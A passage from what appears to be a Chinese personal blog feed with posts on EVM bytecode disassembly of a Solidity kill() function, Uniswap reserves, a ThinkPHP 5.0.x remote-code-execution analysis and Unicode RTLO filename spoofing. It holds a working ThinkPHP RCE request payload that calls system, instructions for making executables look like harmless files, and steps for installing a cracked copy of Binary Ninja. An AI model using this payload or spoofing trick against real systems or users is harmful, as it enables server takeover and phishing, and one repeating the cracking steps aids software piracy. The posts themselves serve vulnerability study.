<p>这次让我们分析一下<code>kill()</code>方法。</p>
<p>每份智能合约中都存在<code>dispatcher</code>。<code>kill()</code>的函数标识符为<code>0x41c0e1b5</code>，这是因为该ID是<code>kill()</code>方法 <code>keccak256哈希</code>的前4个字节：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keccak256(&quot;kill()&quot;) = 41c0e1b5...</span><br></pre></td></tr></table></figure>
<p><code>Dispatcher</code>会检查发往合约的交易数据，决定是否要与<code>kill()</code>函数进行通信。大家可以回顾之前那篇文章，详细了解我们分解过的那些指令。回顾一下。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717224554.png" alt="20220717224554" /></p>
<p>这里我们分析下当dispatcher把我们带到这个函数时会发生什么情况。</p>
<h1>kill():</h1>
<p><code>Greeter.sol</code>中的<code>kill()</code>函数实际上继承自上一层的<code>mortal</code>合约:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract mortal &#123;</span><br><span class="line">    <span class="comment">/* Define variable owner of the type address */</span></span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Function to recover the funds on the contract */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">kill</span>(<span class="params"></span>) &#123; <span class="keyword">if</span> (msg.<span class="property">sender</span> == owner) <span class="title function_">selfdestruct</span>(owner); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract greeter is mortal &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于<code>greeter is mortal</code>，因此<code>greeter</code>可以访问<code>mortal</code>的所有函数以及成员。即便我们只是把<code>greeter</code>的字节码加载到<code>Binary Ninja</code>中，由于存在这种继承关系，该字节码中也会包含<code>mortal</code>的所有函数。</p>
<p><code>kill()</code>函数有以下执行逻辑：</p>
<p>1、检查发送交易的地址是否与合约的<code>address owner</code>成员相匹配。<br />
2、如果相匹配，<code>kill()</code>就会调用内置的<code>selfdestruct</code>函数，将<code>owner</code>地址以参数形式传入。</p>
<p><code>selfdestruct</code>实际上是一种操作码（opcode），因此其实已经内置在EVM（以太坊虚拟机）中。理论上讲，这是我们从以太坊区块链上删除智能合约的唯一方法。如果你的合约接收以太币（ether），那么你以参数形式传递给<code>selfdestruct</code>的那个地址会在合约代码被删除前接收存储在你合约中的所有以太币。</p>
<p><code>selfdestruct</code>（EIP6之前称为<code>suicide</code>）的功能是允许人们通过删除旧的或者未使用的合约来清理区块链。如果有人将以太币发送给已经销毁的合约，那么这些以太币将永远丢失，因为合约地址已经不再具备将以太币转移到另一个地址的任何代码。大家可以访问此<a href="http://solidity.readthedocs.io/en/develop/introduction-to-smart-contracts.html#self-destruct">链接</a>了解关于<code>selfdestruct</code>的更多信息。</p>
<h1>反汇编kill()函数:</h1>
<p>接下来让我们反汇编<code>kill()</code>，检查相关操作码。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717225237.png" alt="20220717225237" /></p>
<blockquote>
<p>与原文的图不同，以我自己反编译出来的图为准，参考思路，自己推导</p>
</blockquote>
<h1>优化:</h1>
<p>作为一门高级语言，在编写智能合约这样艰巨的任务方面Solidity已经表现得非常不错。然而，由于这门语言仍属于较新颖的一门语言（对于以太坊来说也是如此），因此Solidity编译器solc在编译出来的字节码中仍然会产生冗余的指令。</p>
<p><code>solc</code>编译器有一个<code>optimizer</code>标志，可以很好地解决这些冗余问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">solc --bin-runtime --optimize --optimize-runs 200 Greeter.sol</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ solc --bin-runtime --optimize --optimize-runs 200 Greeter.sol</span><br><span class="line"></span><br><span class="line">======= Greeter.sol:Greeter =======</span><br><span class="line">Binary of the runtime part:</span><br><span class="line">608060405234801561001057600080fd5b50600436106100365760003560e01c806341c0e1b51461003b578063cfae321714610045575b600080fd5b6100436100c2565b005b61004d6100da565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561008757818101518382015260200161006f565b50505050905090810190601f1680156100b45780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6000546001600160a01b03163314156100d85733ff5b565b60018054604080516020601f600260001961010087891615020190951694909404938401819004810282018101909252828152606093909290918301828280156101655780601f1061013a57610100808354040283529160200191610165565b820191906000526020600020905b81548152906001019060200180831161014857829003601f168201915b505050505090509056fea265627a7a72315820f0f8fc027bc72a7f7a88206c8888b78ea298d3406b28656dade0edc239a06b0b64736f6c63430005110032</span><br><span class="line"></span><br><span class="line">======= Greeter.sol:Mortal =======</span><br><span class="line">Binary of the runtime part:</span><br><span class="line">6080604052348015600f57600080fd5b506004361060285760003560e01c806341c0e1b514602d575b600080fd5b60336035565b005b6000546001600160a01b0316331415604a5733ff5b56fea265627a7a72315820195b62087d88b621dfcba99834f4c148a593ab135f2a30aea71437ef0cc9491e64736f6c63430005110032</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717225858.png" alt="20220717225858" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717230328.png" alt="20220717230328" /></p>
<p>优化后的opcode确实短一些，相应的图也简洁一些了。我们会继续分析经过优化后的字节码。</p>
<h1>进入kill()函数:</h1>
<p>继续分析<code>kill()</code>的指令：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717230520.png" alt="20220717230520" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717233753.png" alt="20220717233753" /></p>
<p>模拟栈的操作过程中，暂时搞不清楚左位移怎么计算，暂时先跳过。直接看<a href="https://ethervm.io/decompile">online decompile</a>的输出好了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Inputs[2]</span></span><br><span class="line">	<span class="comment">// &#123;</span></span><br><span class="line">	<span class="comment">//     @00C5  storage[0x00] // contract owner&#x27;s address</span></span><br><span class="line">	<span class="comment">//     @00CF  msg.sender</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Block ends with conditional jump to 0x00d8, if !(msg.sender == (0x01 &lt;&lt; 0xa0) - 0x01 &amp; storage[0x00])</span></span><br></pre></td></tr></table></figure>
<p><code>EQ</code>那里会检查 调用者地址 是否等于 合约所有者的地址。</p>
<p>其实这对应于<code>kill()</code>函数中<code>if (msg.sender == owner)</code>这条语句。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Function to recover the funds on the contract */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">kill</span>(<span class="params"></span>) &#123; <span class="keyword">if</span> (msg.<span class="property">sender</span> == owner) <span class="title function_">selfdestruct</span>(owner); &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717234724.png" alt="20220717234724" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717234850.png" alt="20220717234850" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CALLER  // msg.sender压入栈顶，经过前面的判断也就是owner了</span><br><span class="line">SELFDESTRUCT // destroys the contract and sends all funds to addr.</span><br></pre></td></tr></table></figure>
<p>这个指令块的最后一条指令是<code>SELFDESTRUCT</code>，该指令会将栈顶元素当成存储以太币的所有合约的目的地址，然后删除所有合约的代码。现在我们的合约代码已经被删除，存储在合约中的所有以太币已经发送到owner。Over…</p>
<h1>Summary:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717235727.png" alt="20220717235727" /></p>
<p>原文没有给出编译器的版本，我用的0.5.17,比较新升级过的编译器应该是采用了<code>EIP-145</code>的建议：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>EVM 缺少按 位移位运算符，但支持其他逻辑和算术运算符。</p>
</li>
<li class="lvl-2">
<p>移位操作可以通过算术运算符实现，但成本更高，并且需要主机更多的处理时间。</p>
</li>
<li class="lvl-2">
<p>实现SHL和SHR使用算术每 35 个 gas，而建议的指令需要 3 个 gas。</p>
</li>
</ul>
<p>所以，新编译器的结果少了很多指令，与原文的汇编代码和图都有很大的出入。但思路是差不多的，可以自己参考推导，模拟栈的操作。</p>
<p>evm的很多优化升级都是围绕着<code>gas</code>进行的，不断追求地去降低交易成本。每个opcode都有它对应的gas消耗量，新版编译器(带优化参数)能编译出更短的opcode，可大大降低gas。每个函数都降低一些gas,那成千上万的交易就会省下很多gas.</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://cypherpunks-core.github.io/ethereumbook/13evm.html">https://cypherpunks-core.github.io/ethereumbook/13evm.html</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/epik-systems/understanding-solidity-assembly-using-shr-and-shl-for-byte-manipulation-a9f3503cc8d9">Understanding Solidity Assembly: Using <code>shr</code> and <code>shl</code> for Byte Manipulation</a></p>
</li>
<li class="lvl-2">
<p><a href="https://eips.ethereum.org/EIPS/eip-145">EIP-145：EVM 中的按位移位指令 </a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethervm.io/decompile">online decompile</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md">https://github.com/CoinCulture/evm-tools/blob/master/analysis/guide.md</a> (每个opcode的出入参个数)</p>
</li>
<li class="lvl-2">
<p><a href="https://www.ethervm.io/#MSTORE">https://www.ethervm.io/#MSTORE</a> (这里可以看每个opcode对stack的操作)</p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.github.io/yellowpaper/paper.pdf">https://ethereum.github.io/yellowpaper/paper.pdf</a> 黄皮书里的附录</p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-逆向工具BinaryNinja搭配ethersplay使用记录</title>
    <url>/2022/60923.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<blockquote>
<p>对EVM字节码进行反编译是理解高级语言solidity如何在EVM中运作的一个极好的方式 ——《精通以太坊》</p>
</blockquote>
<h1>逆向工具BinaryNinja:</h1>
<h2 id="破解版安装">破解版安装:</h2>
<p><a href="https://www.52pojie.cn/thread-1583596-1-1.html">下载链接</a></p>
<p>app,找到<code>Binary Ninja</code>,显示包内容，替换文件<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717095312.png" alt="20220717095312" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入到Crack目录</span></span><br><span class="line"><span class="comment"># 签名方法</span></span><br><span class="line">codesign --sign - --force --deep /Applications/Binary\ Ninja.app</span><br></pre></td></tr></table></figure>
<p>然后就能正常打开了</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717105254.png" alt="20220717105254" /></p>
<h1>ethersplay插件:</h1>
<p><a href="https://github.com/crytic/ethersplay">github链接</a></p>
<h2 id="安装">安装:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>git clone下载</p>
</li>
<li class="lvl-2">
<p>创建venv环境</p>
</li>
<li class="lvl-2">
<p>安装依赖包 <code>$ pip install -r requirements.txt</code></p>
</li>
</ul>
<h2 id="链接到BinaryNinja插件文件夹">链接到BinaryNinja插件文件夹:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717105648.png" alt="20220717105648" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入到插件文件夹</span></span><br><span class="line"><span class="comment"># 创建链接</span></span><br><span class="line"><span class="built_in">ln</span> -s &lt;your_download_location&gt;/ethersplay/ethersplay .</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717105809.png" alt="20220717105809" /></p>
<h2 id="配置BinaryNinja的python环境">配置BinaryNinja的python环境:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717110136.png" alt="20220717110136" /></p>
<h1>Demo使用:</h1>
<p><code>Ethersplay</code>将原始二进制格式的 evm 字节码作为输入。</p>
<p>要获得solidity 文件的字节码，请使用<code>solc</code>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>solc --bin-runtime file.sol：打印合约运行时部分的字节码（大多数情况下）。</p>
</li>
<li class="lvl-2">
<p>solc --bin file.sol：打印合约（构造函数）的初始化字节码，</p>
</li>
</ul>
<p>test.sol使用以下内容的示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract <span class="title class_">Test</span> &#123;</span><br><span class="line">    uint256 value;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params"></span>) &#123;</span><br><span class="line">        value = <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set_value</span>(<span class="params">uint256 v</span>) &#123;</span><br><span class="line">        value = v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行solidity编译：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">solc --bin-runtime test.sol</span><br></pre></td></tr></table></figure>
<p><code>solc</code> 将字节码打印到标准输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">======= test.sol:Test =======</span><br><span class="line">Binary of the runtime part:</span><br><span class="line">60606040523615603d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063b0f2b72a146041575b5b5b005b3415604b57600080fd5b605f60048080359060200190919050506061565b005b806000819055505b505600a165627a7a72305820c177a64bf54a26574918ddc2201f7ab2dd8619d6c3ee87ce9aaa1eb0e0b1d4650029</span><br></pre></td></tr></table></figure>
<p>复制 ascii 十六进制字符串，然后在 <code>Binary Ninja</code> 中创建一个新文件。右键单击并选择<code>Paste From -&gt; Raw Hex</code>。将此文件另存为<code>test.evm</code>并关闭它。</p>
<p>或者，将 ascii 十六进制字符串粘贴到一个新的文本文件中，然后<code>utils/convert_bytecode.py</code>在该文件上运行。</p>
<p><code>test.evm</code>现在可以加载到BinaryNinja中。</p>
<p>注意：文件必须<code>.evm</code>以EVM字节码二进制文件结尾。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220717110953.png" alt="20220717110953" /></p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.52pojie.cn/thread-1583596-1-1.html">https://www.52pojie.cn/thread-1583596-1-1.html</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/crytic/ethersplay">https://github.com/crytic/ethersplay</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
        <tag>EVM</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</title>
    <url>/2019/14782.html</url>
    <content><![CDATA[<h1>漏洞复现</h1>
<p>未开启debug模式,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url: </span><br><span class="line"></span><br><span class="line">http://tp1-11:8888/public/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7015713b.jpg" alt="" /></p>
<h1>漏洞分析:</h1>
<p>定位关键代码:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d702b349b.jpg" alt="" /></p>
<p>第525行: 读取了配置文件的<code>var_method</code>,</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7034882d.jpg" alt="" /></p>
<p>并赋值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;method = _method</span><br></pre></td></tr></table></figure>
<p>第526行:</p>
<p>引用了外部变量$POST</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d703bcc3f.jpg" alt="" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;method&#125;(<span class="variable">$_POST</span>);  </span><br></pre></td></tr></table></figure>
<p>执行结果:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d70444143.jpg" alt="" /></p>
<p>将Request类的method覆盖了,这个时候将调用Request类构造函数<code>__construct</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7055332e.jpg" alt="" /></p>
<p>构造函数引入了外部变量,准备创建一个新实例</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d705c5a02.jpg" alt="" /></p>
<p>这个实例的属性</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>$method</code>被设置成了<code>get</code></p>
</li>
<li class="lvl-2">
<p><code>$get</code>方法的请求参数被设置成了一个array,值为<code>whoami</code></p>
</li>
<li class="lvl-2">
<p>全局过滤规则<code>$filter</code>被设置成了一个array,值为<code>system</code></p>
</li>
</ul>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7068e01a.jpg" alt="" /></p>
<p>这个时候实例的初始化完成了。</p>
<p>跳回到了<code>Route.php</code>检测URL路由的函数<code>check()</code>,这个时候的<code>method</code>值为<code>get</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d707cf7fd.jpg" alt="" /></p>
<p>经过一连串检测之后,</p>
<p><code>App.php</code>run()函数对请求执行调用分发</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d70872afc.jpg" alt="" /></p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7qen6irnj311v0da46r.jpg" alt="" /></p>
<p>继续跟进，</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz7qhscv91j312u0lugyx.jpg" alt="" /></p>
<p>调用栈:</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz7qk80k5kj309c05a0uh.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>param()</code>获取当前请求的参数</p>
</li>
<li class="lvl-2">
<p><code>method()</code>当前的请求类型</p>
</li>
<li class="lvl-2">
<p><code>server()</code>获取server参数</p>
</li>
<li class="lvl-2">
<p><code>input()</code>获取变量 支持过滤和默认值</p>
</li>
<li class="lvl-2">
<p><code>getFilter()</code>获取过滤方法</p>
</li>
</ul>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7qnb07thj30jj06uju4.jpg" alt="" /></p>
<p>这个时候我们之前创建的请求实例的<code>filter</code>方法为<code>system</code></p>
<p>继续</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7qur7jtvj309e01vgma.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>param()</code>获取当前请求的参数</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz7qvuht18j30s00con3k.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>get()</code>设置获取GET参数</p>
</li>
</ul>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fz7qwkd5yrj30ot08l428.jpg" alt="" /></p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fz7r0j1jbdj309d01vaar.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>input()</code>获取变量 支持过滤和默认值</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fz7r1w473pj30in0m4gsh.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>array_walk_recursive()</code></p>
</li>
<li class="lvl-2">
<p><code>filterValue</code>递归过滤给定的值<br />
<img src="https://ws2.sinaimg.cn/large/006tNc79gy1fz7r3rql44j30o70ewwl1.jpg" alt="" /></p>
</li>
</ul>
<p>执行结果:</p>
<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fz7r53bec4j31080f40zt.jpg" alt="" /></p>
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://xz.aliyun.com/t/3845">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/u012903789/article/details/82433160">php://input</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode RTLO(Right-To-Left Override)字符欺骗</title>
    <url>/2020/28275.html</url>
    <content><![CDATA[<h1>什么是RTLO:</h1>
<p>RTLO是一个8238的Unicode字符，它的作用是让紧跟在后面的字符串倒序： <a href="http://www.codetable.net/decimal/8238">http://www.codetable.net/decimal/8238</a></p>
<p>可以用来欺骗用户打开可执行文件（钓鱼攻击），或者欺骗后端应用的检查机制</p>
<hr />
<h1>创建欺骗文件:</h1>
<p>1.使用名称<code>TestingRTLO[U+202E]xcod.txt</code>创建一个文件</p>
<p>2.windows自带的character map软件中,找到对应的字符.</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103632.png" alt="20201110103632" /></p>
<p>3.复制替换<code>[U + 202E]</code>字符,保存.</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103755.png" alt="20201110103755" /></p>
<p>在软件中发送过去</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103830.png" alt="20201110103830" /></p>
<p>下载来是</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110103914.png" alt="20201110103914" /></p>
<p>同理可制作一个exe结尾的。</p>
<p>发过去是log结尾</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110104003.png" alt="20201110104003" /></p>
<p>下载到本地,实际上是exe结尾的。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110104018.png" alt="20201110104018" /></p>
<hr />
<h1>危害:</h1>
<p>可制作以下后缀名的文件:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>.bat</p>
</li>
<li class="lvl-2">
<p>.exe</p>
</li>
<li class="lvl-2">
<p>.cmd</p>
</li>
<li class="lvl-2">
<p>.com</p>
</li>
<li class="lvl-2">
<p>.lnk</p>
</li>
<li class="lvl-2">
<p>.pif</p>
</li>
<li class="lvl-2">
<p>.scr</p>
</li>
<li class="lvl-2">
<p>.vb</p>
</li>
<li class="lvl-2">
<p>.vbe</p>
</li>
<li class="lvl-2">
<p>.vbs</p>
</li>
<li class="lvl-2">
<p>.wsh</p>
</li>
</ul>
<hr />
<h1>修复方案:</h1>
<p>参考:<a href="https://github.com/nextcloud/server/pull/10030">https://github.com/nextcloud/server/pull/10030</a></p>
<p>把该Unicode字符过滤掉</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201110104540.png" alt="20201110104540" /></p>
<hr />
<h1>漏洞案例:</h1>
<p><a href="https://hackerone.com/reports/229170">RTLO character allowed in shared files</a><br />
<a href="https://hackerone.com/reports/196222">RTLO char allowed in chat</a></p>
<hr />
<h1>refs:</h1>
<p><a href="https://resources.infosecinstitute.com/topic/spoof-using-right-to-left-override-rtlo-technique-2/#:~:text=What%20is%20RTLO%3F,right%2Dto%2Dleft%20order.">Spoof Using Right to Left Override (RTLO) Technique</a><br />
<a href="http://www.lijiejie.com/unicode-rtlo-right-to-left-override-issue/">Unicode RTLO(Right-To-Left Override) Security ISSUE</a></p>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Uniswap-getReserves获取储备量</title>
    <url>/2022/15785.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>简单过一下uniswap的Pair合约的内容，主要了解清楚getReserves函数。</p>
<h1>合约结构</h1>
<p>根据文档简单过一遍</p>
<p><strong>Event:</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Mint 创造流动性token时触发</p>
</li>
<li class="lvl-2">
<p>Burn 销毁流动性token时触发</p>
</li>
<li class="lvl-2">
<p>Swap 交换时触发</p>
</li>
<li class="lvl-2">
<p>Sync 储备量被更新时(mint、burn、swap、sync)触发</p>
</li>
</ul>
<p><strong>Read-Only Functions:</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>MINIMUM_LIQUIDITY 常量值1000</p>
</li>
<li class="lvl-2">
<p>factory 返回工厂地址</p>
</li>
<li class="lvl-2">
<p>token0 排序较低的token地址</p>
</li>
<li class="lvl-2">
<p>token1 排序较高的token地址</p>
</li>
<li class="lvl-2">
<p>getReserves 返回token0和token1的储备量，用于交易或分配流动性</p>
</li>
<li class="lvl-2">
<p>price0CumulativeLast</p>
</li>
<li class="lvl-2">
<p>price1CumulativeLast</p>
</li>
<li class="lvl-2">
<p>kLast</p>
</li>
</ul>
<p><strong>State-Changing Functions:</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>mint 创建token</p>
</li>
<li class="lvl-2">
<p>burn 销毁</p>
</li>
<li class="lvl-2">
<p>swap 交换</p>
</li>
<li class="lvl-2">
<p>skim</p>
</li>
<li class="lvl-2">
<p>sync 同步</p>
</li>
</ul>
<h1>getReserves获取储备量</h1>
<p>getReserves</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getReserves</span>(<span class="params"></span>) external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);</span><br></pre></td></tr></table></figure>
<p>Returns the reserves of token0 and token1 used to price trades and distribute liquidity. See Pricing.<br />
Also returns the block.timestamp (mod 2**32) of the last block during which an interaction occured for the pair.</p>
<p>主要是返回Pair里token0和token1的储备量</p>
<h1>token0 &amp; token1</h1>
<p>token0</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">token0</span>(<span class="params"></span>) external view returns (address);</span><br></pre></td></tr></table></figure>
<p>Returns the address of the pair token with the lower sort order.</p>
<p>token1</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">token1</span>(<span class="params"></span>) external view returns (address);</span><br></pre></td></tr></table></figure>
<p>Returns the address of the pair token with the higher sort order.</p>
<p>可以在pair的合约里查到token0和token1分别的address</p>
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220525153407.png" width="50%" height="50%" />
<h1>测试储备量的变化：</h1>
<h2 id="AddLiquidity">AddLiquidity:</h2>
<p>在添加流动性之前，查询结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  5462692571130940(0.00546269257113094) USDT</span><br><span class="line">&gt;  _reserve1   uint112 :  5383891113691435(0.005383891113691435) Token</span><br></pre></td></tr></table></figure>
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220525153952.png" width="50%" height="50%" />
<p>分别添加流动性，各10个后，pair里的储备量结果发生变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  10151827943605108889(10.151827943605108889) USDT ↑</span><br><span class="line">&gt;  _reserve1   uint112 :  10005383891113691435(10.005383891113691435) Token ↑</span><br></pre></td></tr></table></figure>
<h2 id="Sell：">Sell：</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  10151827943605108889(10.151827943605108889) USDT</span><br><span class="line">&gt;  _reserve1   uint112 :  10005383891113691435(10.005383891113691435) Token</span><br></pre></td></tr></table></figure>
<p>token卖成USDT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  9669575752865546229(9.669575752865546229) USDT ↓</span><br><span class="line">&gt;  _reserve1   uint112 :  10505383891113691435(10.505383891113691435) Token ↑</span><br></pre></td></tr></table></figure>
<p>token传进pair，token储备量增加<br />
pair流出USDT，USDT储备量减少</p>
<h2 id="Buy">Buy:</h2>
<p>与Sell行为相反，USDT ↑、Token↓</p>
<table>
<thead>
<tr>
<th>行为</th>
<th>token0储备量（USDT）</th>
<th>token1储备量（Token）</th>
</tr>
</thead>
<tbody>
<tr>
<td>Buy</td>
<td>↑</td>
<td>↓</td>
</tr>
<tr>
<td>Sell</td>
<td>↓</td>
<td>↑</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>↑</td>
<td>↑</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>↓</td>
<td>↓</td>
</tr>
</tbody>
</table>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">uniswap doc</a></p>
</li>
<li class="lvl-2">
<p><a href="https://pancake.kiemtienonline360.com/#/swap">pancake swap测试网</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SmartContract</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
        <tag>Uniswap</tag>
      </tags>
  </entry>
  <entry>
    <title>Uniswap-恒定乘积公式原理</title>
    <url>/2022/54061.html</url>
    <content><![CDATA[<h1>Pre:</h1>
